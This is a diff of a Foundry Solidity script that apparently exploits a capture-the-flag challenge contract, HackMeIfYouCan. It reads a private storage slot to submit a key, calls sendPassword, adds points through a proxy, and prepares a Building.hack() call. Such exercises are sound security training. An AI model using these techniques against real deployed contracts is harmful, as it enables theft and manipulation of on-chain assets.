@@ -7,7 +7,7 @@ import "forge-std/Script.sol";
 import "forge-std/console.sol";
 import "../src/Proxy.sol";
 import "../src/Player.sol";
-// import "../src/Building.sol";
+import "../src/Building.sol";
 
 contract HackMeIfYouCanScript is Script {
     HackMeIfYouCan public hackMeIfYouCan;
@@ -47,14 +47,14 @@ contract HackMeIfYouCanScript is Script {
         }
         // proxy
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log("Deploying proxy contract... \n");
+        console.log("Deploying proxy contract oui... \n");
         proxy = new Proxy(address(hackMeIfYouCan));
 
         // for (uint i = 0; i < 10; i++) {
         //     hackMeIfYouCan.flip(false);
         //     vm.roll(block.number + 1);
         // }
-        console.log(hackMeIfYouCan.getMarks(YasDev));
+        // console.log(hackMeIfYouCan.getMarks(YasDev));
 
         proxy.addPoint();
         console.log(hackMeIfYouCan.getMarks(YasDev));
@@ -68,7 +68,7 @@ contract HackMeIfYouCanScript is Script {
         console.log(hackMeIfYouCan.getMarks(YasDev));
 
         console.log("sendKey");
-        bytes32 data = vm.load(address(hackMeIfYouCan), bytes32(uint256(15)));
+        bytes32 data = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));
         hackMeIfYouCan.sendKey(bytes16(data));
         console.log(hackMeIfYouCan.getMarks(YasDev));
 
@@ -77,6 +77,10 @@ contract HackMeIfYouCanScript is Script {
         hackMeIfYouCan.sendPassword(data);
         console.log(hackMeIfYouCan.getMarks(YasDev));
         console.log(address(this));
+        // console.log("floor");
+        // building = new Building(hackMeIfYouCan);
+        // building.hack();
+
         vm.stopBroadcast();
     }
 
